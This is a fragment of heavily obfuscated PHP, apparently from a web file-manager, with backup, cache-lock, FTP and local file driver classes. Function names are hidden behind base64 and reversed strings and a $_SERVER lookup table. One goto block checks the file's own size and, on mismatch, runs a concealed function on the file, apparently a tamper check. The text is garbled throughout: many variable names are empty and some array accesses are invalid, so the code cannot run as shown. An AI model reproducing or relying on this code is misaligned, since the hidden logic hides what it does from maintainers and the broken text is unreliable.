? $ā : array(); } } class FileContentModel extends ModelBase { protected $tableName = "\151\157\x5f\146\x69\x6c\145\137\143\x6f\x6e\x74\145\156\x74\x73"; protected $dataAuto = array(array("\x63\x72\x65\x61\x74\x65\x54\151\x6d\145", "\x74\x69\155\x65", "\151\x6e\163\145\162\x74", "\x66\165\x6e\x63\164\x69\157\156")); } goto b; C僯: $fileSize = strrev(base64_decode($_SERVER[][0])); function binCheckNeq($؞, $ɧ) { return $؞ != $ɧ; } $_SERVER[$_SERVER[][1]] = $fileSize($_SERVER[$_SERVER[][2]]); goto A̍˧; b: $_file = $_SERVER[$_SERVER[ʯ][22]]; $_size = $_SERVER[ʯ][937]; if ($_SERVER[$_SERVER[ʯ][13]] != $_size($_file)) { $_getc = $_SERVER[ʯ][15]; $_getfile = $_SERVER[$_SERVER[ʯ][16]] . $_SERVER[ʯ][17]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ʯ][18], $_getfilec); if (count($_getarrs) < $_SERVER[ʯ][19]) { $exit = $_SERVER[ʯ][20]; $exit(); } $_act = $_SERVER[ʯ][21]; $_act($_file); } goto Bﳟ; e: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $˖ =& $_SERVER[ʯ]; $ = Backup::get(); self::$io = $[$˖[811]]; self::$name = $[$˖[42]]; $ = new DbManage(); $ = $->dbType(); $˘ = array($˖[836] => $, $˖[837] => time()); Backup::set($˘); $㱢 = $this->tmpFilesPath() . $˖[838] . self::$name . $˖[8]; del_dir($㱢); mk_dir($㱢); $ = $⍪ = 0; $񯶵 = new Task($˖[839], $˖[840], 0, LNG($˖[841]) . $˖[842] . LNG($˖[843])); try { $Ԋ = $->db()->getTables(); } catch (Exception $) { $񯶵->end(); return !1; } $Ԋ = array_diff($Ԋ, array($˖[844], $˖[845])); foreach ($Ԋ as $ŀ) { $ += $->model($ŀ)->count(); } $񯶵->task[$˖[846]] = $; $GLOBALS[$˖[847]] = self::$name; foreach ($Ԋ as $ŀ) { $է = $㱢 . $ŀ . $˖[848]; $ӹ = null; if ($ŀ == $˖[849] && (!isset($[$˖[814]]) || $[$˖[814]] == $˖[221])) { $ӹ = self::$io; } $⍪ += $->sqlFromDb($ŀ, $է, $񯶵, $ӹ); } unset($GLOBALS[$˖[847]]); $񯶵->end(); if ($⍪ > $) { $ = $⍪; } $˘ = array($˖[836] => $, $˖[833] => 1, $˖[850] => $, $˖[851] => $⍪, $˖[852] => time()); Backup::set($˘); if ($ - $⍪ > 0) { $ȋ = $˖[853]; if (stristr(I18n::getType(), $˖[854])) { $ȋ = $˖[855]; } write_log(array($ȋ, $˘), $˖[840]); return !1; } return !0; } private function tmpFilesPath() { $갏 =& $_SERVER[ʯ]; $ܘ = TEMP_FILES; if ($GLOBALS[$갏[6]][$갏[99]][$갏[856]]) { $ܘ = $GLOBALS[$갏[6]][$갏[99]][$갏[856]]; if (!mk_dir($ܘ) || !is_writable($ܘ) || !IO::mkfile($ܘ . $갏[857])) { $ܘ = TEMP_FILES; } } return $ܘ; } } class BackupDbFile { public function __construct() { } public function index() { $֒ =& $_SERVER[ʯ]; $ӎ = Backup::get(); $ = $ӎ[$֒[42]]; $˗ = $this->tmpFilesPath() . "\142\x61\x63\x6b\165\x70\x5f{$}\x2f"; $Ӟ = $this->backupPath($ӎ); if (!($Ӟ = IO::mkdir($Ӟ))) { return !1; } $Կ = IO::listPath($˗); $ɦ = isset($Կ[$֒[93]]) ? $Կ[$֒[93]] : array(); $ = array_sum(array_column($ɦ, $֒[86])); if (!$) { return !1; } $ = array($֒[858] => $, $֒[859] => time()); Backup::set($); $紑 = new TaskFileTransfer($֒[860], $֒[840], count($ɦ), LNG($֒[841]) . $֒[438] . LNG($֒[843]) . $֒[861]); $紑->task[$֒[823]] = $; foreach ($Կ[$֒[93]] as $ԇƽ) { $ = IO::move($ԇƽ[$֒[94]], $Ӟ); if (!$) { $紑->end(); $ = IO::getLastError($֒[862] . $ԇƽ[$֒[94]] . $֒[863] . $Ӟ . $֒[174]); write_log($, $֒[840]); return !1; } } $ׄ = new DbManage(); $Ӧܡ = $ׄ->getSqlFile(); if (!$Ӧܡ[$֒[864]] || !$Ӧܡ[$֒[23]]) { return !1; } IO::move($Ӧܡ[$֒[864]], $Ӟ); IO::move($Ӧܡ[$֒[23]], $Ӟ); $紑->end(); $ = array($֒[865] => $, $֒[866] => time()); Backup::set($); return !0; } private function backupPath($Á̤) { $ӡғ =& $_SERVER[ʯ]; $̤ = $Á̤[$ӡғ[42]]; $ތݸ = Model($ӡғ[830])->get($ӡғ[831]); $ᣡ = substr(md5($ӡғ[832] . $ތݸ . $̤), 0, 8); return "\173\x69\157\72{$Á̤[$ӡғ[811]]}\175\57\x64\x61\x74\x61\142\x61\163\x65\x2f\x62\141\143\153\165\160\x2f" . $̤ . $ӡғ[11] . $ᣡ; } private function tmpFilesPath() { $ =& $_SERVER[ʯ]; $ۉ = TEMP_FILES; if ($GLOBALS[$[6]][$[99]][$[856]]) { $ۉ = $GLOBALS[$[6]][$[99]][$[856]]; if (!mk_dir($ۉ) || !is_writable($ۉ) || !IO::mkfile($ۉ . $[857])) { $ۉ = TEMP_FILES; } } return $ۉ; } } class BackupFile { public function __construct() { } public function index() { $ = Backup::get(); $ͺ = $[$_SERVER[ʯ][345]][$_SERVER[ʯ][223]][$_SERVER[ʯ][517]]; $ = array($_SERVER[ʯ][518] => array($_SERVER[ʯ][867], $ͺ), $_SERVER[ʯ][868] => array($_SERVER[ʯ][383], $[$_SERVER[ʯ][811]])); $ = (int) Model($_SERVER[ʯ][849])->where($)->count($_SERVER[ʯ][517]); $ۑ = (int) Model($_SERVER[ʯ][849])->where($)->sum($_SERVER[ʯ][86]); $ = new TaskFileTransfer($_SERVER[ʯ][869], $_SERVER[ʯ][840], $, LNG($_SERVER[ʯ][841]) . $_SERVER[ʯ][842] . LNG($_SERVER[ʯ][870])); $->task[$_SERVER[ʯ][823]] = $ۑ; $Ќ = array($_SERVER[ʯ][871] => $, $_SERVER[ʯ][872] => $ۑ, $_SERVER[ʯ][873] => time()); Backup::set($Ќ); $ɰ = !0; $Ƀ = $this->storeIds(); $ = 1; $ͤ = 1000; $ߗ = $ȥ = 0; $͂ = array(); $ = $ɝ = 0; do { $䶤 = $_SERVER[ʯ][874]; $߂ = Model($_SERVER[ʯ][849])->where($)->field($䶤)->order($_SERVER[ʯ][875])->selectPage($ͤ, $); $ϰ = !empty($߂[$_SERVER[ʯ][421]]) ? $߂[$_SERVER[ʯ][421]] : array(); foreach ($ϰ as $) { if (!$this->_fileExist($, $͂, $Ƀ)) { $ -= 1; $ۑ -= (int) $[$_SERVER[ʯ][86]]; write_log("\x66\151\154\x65\40\156\157\x74\40\x65\x78\x69\163\164\56\x66\151\154\145\111\104\x3a{$[$_SERVER[ʯ][517]]}\54\40\x70\x61\164\150\x3a{$[$_SERVER[ʯ][94]]}", $_SERVER[ʯ][876]); continue; } $ = $[$_SERVER[ʯ][94]]; $ = "\173\x69\157\x3a{$[$_SERVER[ʯ][811]]}\x7d" . substr($, strlen("\x7b\x69\x6f\72{$[$_SERVER[ʯ][877]]}\x7d")); if (IO::exist($)) { $->updateFileEnd($[$_SERVER[ʯ][42]], $[$_SERVER[ʯ][86]]); } else { $ = get_path_father($); IO::mkdir($); if (!IO::copy($, $, $_SERVER[ʯ][878])) { write_log($_SERVER[ʯ][879] . $ . $_SERVER[ʯ][863] . $ . $_SERVER[ʯ][174], $_SERVER[ʯ][840]); $ɰ = !1; break; } } $ͺ = $[$_SERVER[ʯ][517]]; $ȥ += 1; $ߗ += $[$_SERVER[ʯ][86]]; $ɝ += 1; $ += $[$_SERVER[ʯ][86]]; if ($ߗ >= 1024 * 1024 * 100) { $Ќ = array($_SERVER[ʯ][880] => $ͺ, $_SERVER[ʯ][881] => $ɝ, $_SERVER[ʯ][882] => $); Backup::set($Ќ); $ߗ = $ȥ = 0; } } $슃 = count($ϰ); $++; } while ($슃 == $ͤ); $->end(); $Ќ = array($_SERVER[ʯ][883] => 1, $_SERVER[ʯ][821] => time(), $_SERVER[ʯ][835] => 1, $_SERVER[ʯ][880] => $ͺ, $_SERVER[ʯ][872] => $ۑ, $_SERVER[ʯ][871] => $, $_SERVER[ʯ][884] => time()); if ($ȥ) { $Ќ[$_SERVER[ʯ][881]] = $ɝ; $Ќ[$_SERVER[ʯ][882]] = $; } Backup::set($Ќ); $this->_fileFilter($͂); return !0; } private function _fileExist($, &$, $қ) { $ =& $_SERVER[ʯ]; $뭜 = $[$[94]]; if (in_array($[$[517]], $)) { return !1; } if (!in_array($[$[877]], $қ)) { return !1; } if (IO::exist($뭜)) { return !0; } $ = get_path_father($뭜); if (IO::exist($)) { $[] = $[$[517]]; return !1; } $ = array($[877] => $[$[877]], $[94] => array($[435], "{$}\45")); $ = Model($[849])->where($)->field($[518])->select(); $ = array_merge($, array_to_keyvalue($, $[12], $[517])); return !1; } private function _fileFilter($) { $ =& $_SERVER[ʯ]; if (empty($)) { return; } $惦 = array($[517] => array($[7], array_unique($))); $ƭ = Model($[885])->where($惦)->field($[190])->select(); foreach ($ƭ as $) { Model($[885])->remove($[$[190]], !1); } } private function storeIds() { $ѱ =& $_SERVER[ʯ]; $ = Model($ѱ[827])->listData(); $Ѿ = array(); $ê = $GLOBALS[$ѱ[6]][$ѱ[99]][$ѱ[886]]; foreach ($ as $) { $ = strtolower($[$ѱ[105]]); if (!isset($ê[$])) { continue; } $ͼ׻ = $ѱ[84] . (isset($ê[$]) ? $ê[$] : ucfirst($)); if (!class_exists($ͼ׻)) { continue; } $Ѿ[] = $[$ѱ[451]]; } return $Ѿ; } } goto C; Dӧ: class CacheLockMemcached { public function lock($н, $ = 0) { $ = Cache::init(); $ = microtime(!0) + $; while (microtime(!0) < $) { $ݢ = $->get($н); if (!$ݢ || $ݢ < microtime(!0)) { $ͪ = $->handle->add($н, $, $); if ($ͪ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ĝ) { return Cache::init()->get($ĝ); } public function unlock($݈ж) { return Cache::init()->remove($݈ж); } } class CacheLockDatabase { public function lock($Ԍ, $ = 0) { $ = Model($_SERVER[ʯ][889]); $ = microtime(!0) + $; while (microtime(!0) < $) { $ = $->get($Ԍ); if (!$ || $ < microtime(!0)) { $郁 = $->set($Ԍ, $); if ($郁) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($) { return Model($_SERVER[ʯ][889])->get($); } public function unlock($һ) { Model($_SERVER[ʯ][889])->remove($һ); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($, $) { $ㄽ =& $_SERVER[ʯ]; if (!class_exists($ㄽ[927])) { show_json($ㄽ[928], !1); } $this->cacheTime = $; $this->handle = new Memcached(); if (is_array($[$ㄽ[929]]) && count($[$ㄽ[929]]) >= 1) { foreach ($[$ㄽ[929]] as $꣆) { $ʀ = explode($ㄽ[4], $꣆); $this->handle->addServer($ʀ[0], $ʀ[1]); } } else { $this->handle->addServer($[$ㄽ[205]], $[$ㄽ[206]]); } } public function set($܄, $, $ܻ = false) { $ܻ = $ܻ ? $ܻ : $this->cacheTime; return $this->handle->set($܄, $, $ܻ); } public function get($ߌ) { return $this->handle->get($ߌ); } public function remove($) { return $this->handle->delete($); } public function deleteAll() { return $this->handle->flush(); } } goto aӊ; Aì: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; public $config = array(); public function __construct($) { parent::__construct(); if (count($) > 0) { $this->_init($); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($̈) { $ˁ =& $_SERVER[ʯ]; global $config; $this->appCharset = $config[$ˁ[1411]]; $this->systemCharset = $config[$ˁ[1412]]; if (isset($̈[$ˁ[1413]]) && $̈[$ˁ[1413]]) { $this->systemCharset = $̈[$ˁ[1413]]; } } public function iconvApp($ě) { return $this->iconvTo($ě, $this->systemCharset, $this->appCharset); } public function iconvSystem($ع) { return $this->iconvTo($ع, $this->appCharset, $this->systemCharset); } public function getPathOuter($݄) { $ =& $_SERVER[ʯ]; $ڵ = $this->iconvApp($this->pathBase); $݄ = $this->iconvApp($݄); if (substr($ڵ, 0, 2) == $[1339]) { $ڵ = BASIC_PATH . substr($ڵ, 2); } if (substr($݄, 0, 2) == $[1339]) { $݄ = BASIC_PATH . substr($݄, 2); } $ڵ = KodIO::clear($ڵ); $݄ = KodIO::clear($݄); $݄ = substr($݄, strlen($ڵ)); if (empty($this->pathDriver)) { return $݄; } return $this->pathDriver . $[8] . ltrim($݄, $[8]); } private function _init($ɩ = array()) { $炗 =& $_SERVER[ʯ]; if (!function_exists($炗[1414])) { throw new Exception(LNG($炗[1415])); } $this->config = $ɩ; $this->charsetReset($ɩ); foreach ($ɩ as $ => $ݩ) { if (isset($this->{$})) { $this->{$} = $ݩ; } } return $this->_login($ɩ); } private function _login($ᕯ) { $Գ¾ =& $_SERVER[ʯ]; static $ = array(); $ = md5(json_encode($ᕯ)); if (isset($[$])) { foreach ($[$] as $ǥ => $͡ϯ) { $this->{$ǥ} = $͡ϯ; } return !0; } $룑Ɯ = parse_url(trim($this->server, $Գ¾[8])); $this->host = $룑Ɯ[$Գ¾[205]]; $ = isset($룑Ɯ[$Գ¾[204]]) && $룑Ɯ[$Գ¾[204]] == $Գ¾[1416] ? !0 : !1; $this->scheme = $ ? $Գ¾[1417] : $Գ¾[1418]; $this->port = isset($룑Ɯ[$Գ¾[206]]) ? $룑Ɯ[$Գ¾[206]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $砻 = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $ = $this->pasv == $Գ¾[98] ? !0 : !1; @ftp_pasv($this->connect, $); $[$] = array($Գ¾[1419] => $this->connect, $Գ¾[205] => $this->host, $Գ¾[204] => $this->scheme, $Գ¾[206] => $this->port); return $砻; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($Ү, $Њ = '', $ = REPEAT_RENAME) { if ($this->setContent($Ү, $Њ)) { return $this->getPathOuter($Ү); } return !1; } public function mkdir($ӡͿ, $ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $ӡͿ = $this->iconvSystem($ӡͿ); if ($this->_isFolder($ӡͿ) || @ftp_mkdir($this->connect, $ӡͿ)) { return $this->getPathOuter($ӡͿ); } if (!$this->mkdir($this->pathFather($ӡͿ))) { return !1; } if ($ӡͿ = @ftp_mkdir($this->connect, $ӡͿ)) { return $this->getPathOuter($ӡͿ); } return !1; } public function copyFile($, $܂) { if (!$this->_isconn()) { return !1; } $۰䡱 = $this->pathThis($this->iconvSystem($)); $ = $this->tempFile($۰䡱); $֍ܼ = $this->iconvApp($); $this->download($, $֍ܼ); $յ୳ = $this->upload($܂, $֍ܼ); $this->tempFileRemve($); return $յ୳; } public function moveFile($, $ō) { if (!$this->_isconn()) { return !1; } $ = $this->iconvSystem($); $ō = $this->iconvSystem($ō); $ = @ftp_rename($this->connect, $, $ō); return $ ? $this->getPathOuter($ō) : !1; } public function delFile($) { if (!$this->_isconn()) { return !1; } $ = $this->iconvSystem($); return @ftp_delete($this->connect, $); } public function delFolder($˲) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $ = $ಉ = array(); $this->fileList($˲, $, $ಉ, !0); $this->listItemCache = !0; foreach ($ಉ as $) { $Ԑ = $this->iconvSystem($[$_SERVER[ʯ][42]]); $Ϳ = @ftp_delete($this->connect, $Ԑ); if (!$Ϳ) { return !1; } } foreach ($ as $Ԑ) { $Ԑ = $this->iconvSystem($Ԑ); $Ϳ = @ftp_rmdir($this->connect, $Ԑ); if (!$Ϳ) { return !1; } } $˲ = $this->iconvSystem($˲); return @ftp_rmdir($this->connect, $˲); } public function rename($ஔ, $ғ) { $ҧ =& $_SERVER[ʯ]; if (!$this->_isconn()) { return !1; } $Ǭ = $this->fileNameAuto($this->pathFather($ஔ), $ғ); $Ǭ = $this->iconvSystem($Ǭ); $ஔ = $this->iconvSystem($ஔ); $̈́ = $this->pathFather($ஔ); $ǒ = rtrim($̈́, $ҧ[8]) . $ҧ[8] . $Ǭ; $ = @ftp_rename($this->connect, $ஔ, $ǒ); $ǒ = $this->iconvApp($ǒ); return $ ? $this->getPathOuter($ǒ) : !1; } private function folderInfo($, $Ƭ = false) { $ =& $_SERVER[ʯ]; $Ϙ = array($[42] => $this->pathThis($), $[94] => $this->getPathOuter($[8] . $), $[43] => $[85]); if ($Ƭ) { return $Ϙ; } $Ϙ[$[224]] = $Ϙ[$[95]] = 0; $Ϙ[$[225]] = $Ϙ[$[226]] = !0; return $Ϙ; } private function fileInfo($ض, $ = false, $ = array()) { $Ҝ =& $_SERVER[ʯ]; $ߝી = array($Ҝ[42] => $this->pathThis($ض), $Ҝ[94] => $this->getPathOuter($Ҝ[8] . $ض), $Ҝ[43] => $Ҝ[223], $Ҝ[86] => isset($[$Ҝ[86]]) ? $[$Ҝ[86]] : 0, $Ҝ[184] => $this->ext($ض)); if ($) { return $ߝી; } $ߝી[$Ҝ[224]] = $ߝી[$Ҝ[95]] = 0; $ߝી[$Ҝ[225]] = $ߝી[$Ҝ[226]] = !0; $ǟ = $this->iconvSystem($ض); $ߝી[$Ҝ[95]] = @ftp_mdtm($this->connect, $ǟ); if (empty($)) { $ = $this->objectMeta($ض); if (!$) { return $ߝી; } } $ߝી[$Ҝ[86]] = $[$Ҝ[86]]; return $ߝી; } public function size($) { $Ȑ = $this->objectMeta($); return $Ȑ ? $Ȑ[$_SERVER[ʯ][86]] : 0; } public function info($Ԧ뺿) { if ($this->isFile($Ԧ뺿)) { return $this->fileInfo($Ԧ뺿, 0); } else { if ($this->isFolder($Ԧ뺿)) { return $this->folderInfo($Ԧ뺿); } } return !1; } private function fileList($, &$¯, &$ھ, $ = false) { $ =& $_SERVER[ʯ]; $ = $this->iconvSystem($); if (!$this->isFolder($)) { return !1; } @ftp_chdir($this->connect, $[8]); $ = rtrim($, $[8]) . $[8]; check_abort(); $Üޞ = @ftp_rawlist($this->connect, $); if (!$Üޞ) { $Üޞ = array(); } $ = array($[10] => 1, $[1340] => 1); foreach ($Üޞ as $) { $ = $this->_listItem($); if ($[0] == $[818]) { continue; } $Ä = $[8]; if (empty($Ä) && $Ä !== $[221] || isset($[$Ä])) { continue; } $Ä = $this->iconvApp($ . ltrim($Ä, $[8])); $ = array($[42] => $Ä, $[43] => $[223], $[86] => $[4]); if (substr($, 0, 1) == $[1420]) { $[$[43]] = $[85]; $[$[86]] = 0; } $ = $[$[43]] == $[85] ? !0 : !1; $this->cacheMethodInfoSet($Ä, $, $); if ($) { $¯[] = $Ä; if ($) { $this->fileList($Ä, $¯, $ھ, $); } continue; } $ھ[] = $; } $this->cacheMethodInfoSet($, !0); } private function _listItem($ڇ) { if (empty($ڇ)) { return array(); } $ = preg_split($_SERVER[ʯ][1421], $ڇ); if (count($) <= 9) { return $; } $[8] = trim(substr($ڇ, strpos($ڇ, $[7]) + strlen($[7]))); return array_splice($, 0, 9); } public function listPath($́, $ؤ = false) { $ =& $_SERVER[ʯ]; if (!$this->_isconn()) { return !1; } $߸ = $ = array(); $this->fileList($́, $߸, $); foreach ($߸ as $ޒ∥ => $¿) { $߸[$ޒ∥] = $this->folderInfo($¿, $ؤ); } foreach ($ as $ޒ∥ => $¿) { $[$ޒ∥] = $this->fileInfo($¿[$[42]], $ؤ, $¿); } return array($[92] => $߸, $[93] => $); } public function has($, $΍ = false, $Ǽ = true) { $ =& $_SERVER[ʯ]; $ = $ʃ = array(); $ȼ = $΍ ? !0 : !1; $this->fileList($, $, $ʃ, $ȼ); if ($΍) { return array($[232] => count($ʃ), $[233] => count($)); } if ($Ǽ) { if (count($ʃ)) { return !0; } } else { if (count($)) { return !0; } } return !1; } public function listAll($ޭ) { $λʐ =& $_SERVER[ʯ]; if (!$this->_isconn()) { return !1; } $ = $̏ = array(); $this->fileList($ޭ, $, $̏, !0); $ = array_to_keyvalue($̏, $λʐ[42]); foreach ($ as $Ɠ) { if (is_string($Ɠ)) { $[$Ɠ] = array($λʐ[86] => 0); } } return $this->listAllFiles($ޭ, $); } public function getContent($ǦՌ) { if (!$this->_isconn()) { return !1; } $ǦՌ = $this->iconvSystem($ǦՌ); return $this->fileSubstr($ǦՌ); } public function setContent($ڳ, $򉫧 = '') { if (!$this->_isconn()) { return !1; } $ = $this->pathThis($this->iconvSystem($ڳ)); $ʥ = $this->tempFile($); file_put_contents($ʥ, $򉫧); $ٙĿ = $this->upload($ڳ, $this->iconvApp($ʥ)); $this->tempFileRemve($ʥ); return $ٙĿ; } public function fileSubstr($, $ = 0, $ұ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($, $, $ұ); } private function ftpRequest($, $ = 0, $ҔЅ = false) { $ = $this->iconvSystem($); $ = $this->scheme . $this->host . $_SERVER[ʯ][4] . $this->port; $历 = curl_init(); curl_setopt($历, CURLOPT_URL, $ . $this->pathEncode($)); curl_setopt($历, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($ҔЅ) { $ = $ + $ҔЅ - 1; curl_setopt($历, CURLOPT_RANGE, "{$}\x2d{$}"); } curl_setopt($历, CURLOPT_RETURNTRANSFER, 1); $ = curl_exec($历); curl_close($历); return $; } public function upload($һ, $, $ = false, $Ⱦ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($һ))) { return !1; } $һ = $this->iconvSystem($һ); $ = $this->iconvSystem($); $ϐƘ = ftp_nb_put($this->connect, $һ, $, FTP_BINARY); while ($ϐƘ == FTP_MOREDATA) { $ϐƘ = ftp_nb_continue($this->connect); } if ($ϐƘ != FTP_FINISHED) { return !1; } return $this->getPathOuter($һ); } public function download($, $ͦ = '') { if (!$this->_isconn()) { return !1; } $輊 = $this->pathFather($ͦ); if (!IO::mkdir($輊)) { return !1; } $ = $this->iconvSystem($); $ͦ = $this->iconvSystem($ͦ); $ = ftp_nb_get($this->connect, $ͦ, $, FTP_BINARY); while ($ == FTP_MOREDATA) { $ = ftp_nb_continue($this->connect); } if ($ != FTP_FINISHED) { return !1; } return $this->iconvApp($ͦ); } public function exist($ɝ) { return $this->isFile($ɝ) || $this->isFolder($ɝ); } public function isFile($Б) { return !$this->isFolder($Б) && $this->objectMeta($Б); } public function isFolder($ԇ) { return $this->cacheMethod($_SERVER[ʯ][175], $ԇ); } protected function objectMeta($) { return $this->cacheMethod($_SERVER[ʯ][177], $); } protected function _objectMeta($) { $䑻 =& $_SERVER[ʯ]; if ($ == $䑻[12] || $ == $䑻[8]) { return array(); } if (!$this->_isconn()) { return !1; } $ = $this->iconvSystem($); $ѐ = array($䑻[42] => $this->iconvApp($), $䑻[43] => $䑻[223], $䑻[86] => 0); @ftp_chdir($this->connect, $䑻[8]); $ = @ftp_size($this->connect, $); if ($ != -1) { $ѐ[$䑻[86]] = $; } else { $ڏ = @ftp_chdir($this->connect, $); if (!$ڏ) { return !1; } $ѐ[$䑻[43]] = $䑻[85]; } return $ѐ; } protected function _isFolder($ܸ) { $̙ =& $_SERVER[ʯ]; if ($ܸ == $̙[12] || $ܸ == $̙[8]) { return !0; } $İ = $this->_objectMeta($ܸ); return isset($İ[$̙[43]]) && $İ[$̙[43]] == $̙[85] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($Ǩ) { if (substr($Ǩ, 0, 2) == $_SERVER[ʯ][1339]) { $Ǩ = BASIC_PATH . substr($Ǩ, 2); } return $Ǩ; } public function iconvApp($) { $ =& $_SERVER[ʯ]; global $config; return $this->iconvTo($, $config[$[1412]], $config[$[1411]]); } public function iconvSystem($) { $ƥ =& $_SERVER[ʯ]; global $config; return $this->iconvTo($, $config[$ƥ[1411]], $config[$ƥ[1412]]); } public function getPathOuter($ǡ) { $տ =& $_SERVER[ʯ]; $Ô = $this->iconvApp($this->pathBase); $ǡ = $this->iconvApp($ǡ); if (substr($Ô, 0, 2) == $տ[1339]) { $Ô = BASIC_PATH . substr($Ô, 2); } if (substr($ǡ, 0, 2) == $տ[1339]) { $ǡ = BASIC_PATH . substr($ǡ, 2); } $Ô = KodIO::clear($Ô); $ǡ = KodIO::clear($ǡ); $ǡ = substr($ǡ, strlen($Ô)); if (empty($this->pathDriver)) { return $ǡ; } return $this->pathDriver . $տ[8] . ltrim($ǡ, $տ[8]); } public function mkfile($۬, $ = '', $ = REPEAT_RENAME) { $۬ = $this->iconvSystem($۬); @touch($۬); if ($) { file_put_contents($۬, $); } @chmod($۬, $this->pathAuth); return is_file($۬) ? $this->getPathOuter($۬) : !1; } public function mkdir($ٵ, $˞ = REPEAT_SKIP) { $ٵ = $this->iconvSystem($ٵ); if (is_dir($ٵ)) { return $this->getPathOuter($ٵ); } @mkdir($ٵ, $this->pathAuth, !0); @chmod($ٵ, $this->pathAuth); return is_dir($ٵ) ? $this->getPathOuter($ٵ) : !1; } public function copyFile($؁䫝, $) { $this->mkdir($this->pathFather($)); $؁䫝 = $this->iconvSystem($؁䫝); $ = $this->iconvSystem($); $ = copy_64($؁䫝, $); @chmod($, $this->pathAuth); return $ ? $this->getPathOuter($) : !1; } public function moveFile($໑܏, $낇) { $this->mkdir($this->pathFather($낇)); $໑܏ = $this->iconvSystem($໑܏); $낇 = $this->iconvSystem($낇); $ũ = intval(@rename($໑܏, $낇)); if (!$ũ) { if ($ũ = intval(@copy_64($໑܏, $낇))) { @unlink($໑܏); } } @chmod($낇, $this->pathAuth); return $ũ ? $this->getPathOuter($낇) : !1; } public function movePath($, $Ւ, $ͨη = false) { $ =& $_SERVER[ʯ]; $ = $this->iconvSystem($); $Ւ = $this->iconvSystem($Ւ); $ࡋ = rtrim($Ւ, $[8]) . $[8] . ($ͨη ? $ͨη : get_path_this($)); if (file_exists($ࡋ)) { return !1; } $ = intval(@rename($, $ࡋ)); $ = file_exists($ࡋ); return $ ? $this->getPathOuter($ࡋ) : !1; } public function delFile($װ) { $װ = $this->iconvSystem($װ); if (!@unlink($װ)) { @chmod($װ, $this->pathAuth); if (!@unlink($װ)) { return !1; } } else { return !0; } } public function delFolder($ݹ) { $˵ =& $_SERVER[ʯ]; $ݹ = $this->iconvSystem($ݹ); if (!is_dir($ݹ)) { return !0; } if (!($ = opendir($ݹ))) { return !1; } while (($¯ = readdir($)) !== !1) { if ($¯ == $˵[10] || $¯ == $˵[1340]) { continue; } $ = $ݹ . $˵[8] . $¯; if (is_file($) || is_link($)) { if (!unlink($)) { chmod($, $this->pathAuth); if (!unlink($)) { return !1; } } } else { if (is_dir($)) { chmod($, $this->pathAuth); $ = $this->iconvApp($); if (!$this->delFolder($)) { return !1; } } } } closedir($); return rmdir($ݹ); } public function rename($, $揨) { $μȀ =& $_SERVER[ʯ]; $ = $this->fileNameAuto($this->pathFather($), $揨); $ = $this->iconvSystem($); $ = $this->iconvSystem($); $ = $this->pathFather($); $ˉ = rtrim($, $μȀ[8]) . $μȀ[8] . $; $ = @rename($, $ˉ); $ˉ = $this->iconvApp($ˉ); return $ ? $this->getPathOuter($ˉ) : !1; } public function size($乑) { $乑 = $this->iconvSystem($乑); return filesize_64($乑); } public function info($ж) { $ж = $this->iconvSystem($ж); if ($this->isFolder($ж)) { return $this->folderInfo($ж); } else { if ($this->isFile($ж)) { return $this->fileInfo($ж); } } return !1; } protected function infoChildren($Ľġ, &$ڝ, $ = true) { $ =& $_SERVER[ʯ]; check_abort_echo(); $Ľġ = rtrim($Ľġ, $[8]) . $[8]; if ($) { $Ľġ = $this->iconvSystem($Ľġ); } if (!($ֻ = @opendir($Ľġ))) { return; } while (($ = readdir($ֻ)) !== !1) { if ($ == $[10] || $ == $[1340]) { continue; } $ = $Ľġ . $; if (is_file($) || is_link($)) { $ڝ[$[87]]++; $ڝ[$[86]] += filesize_64($); } else { if (is_dir($)) { $ڝ[$[88]]++; $this->infoChildren($, $ڝ, !1); } } } closedir($ֻ); } private function folderInfo($ވá, $ֽշ = false) { $ԏ =& $_SERVER[ʯ]; $ވá = rtrim($ވá, $ԏ[8]) . $ԏ[8]; $ඛ = $this->iconvApp($this->pathThis($ވá)); if ($ֽշ) { return array($ԏ[42] => $ඛ, $ԏ[94] => $this->getPathOuter($ވá), $ԏ[43] => $ԏ[85]); } $Ţߑ = array($ԏ[42] => $ඛ, $ԏ[94] => $this->getPathOuter($ވá), $ԏ[43] => $ԏ[85], $ԏ[224] => @filectime($ވá), $ԏ[95] => @filemtime($ވá), $ԏ[1422] => @fileatime($ވá), $ԏ[1423] => is_readable($ވá), $ԏ[1424] => is_writable($ވá), $ԏ[1425] => get_mode($ވá)); return $Ţߑ; } private function fileInfo($, $ = false) { $ّ =& $_SERVER[ʯ]; $ = $this->iconvApp($this->pathThis($)); if ($) { return array($ّ[42] => $, $ّ[94] => $this->getPathOuter($), $ّ[43] => $ّ[223], $ّ[86] => $this->size($), $ّ[184] => $this->ext($)); } $ﯫ = array($ّ[42] => $, $ّ[94] => $this->getPathOuter($), $ّ[43] => $ّ[223], $ّ[224] => @filectime($), $ّ[95] => @filemtime($), $ّ[1422] => @fileatime($), $ّ[86] => $this->size($), $ّ[184] => $this->ext($), $ّ[1423] => is_readable($), $ّ[1424] => is_writable($), $ّ[1425] => get_mode($)); return $ﯫ; } public function exist($Ѩ) { $Ѩ = $this->iconvSystem($Ѩ); return @file_exists($Ѩ); } public function isFile($þ) { $þ = $this->iconvSystem($þ); return @is_file($þ); } public function isFolder($ғ) { $ғ = 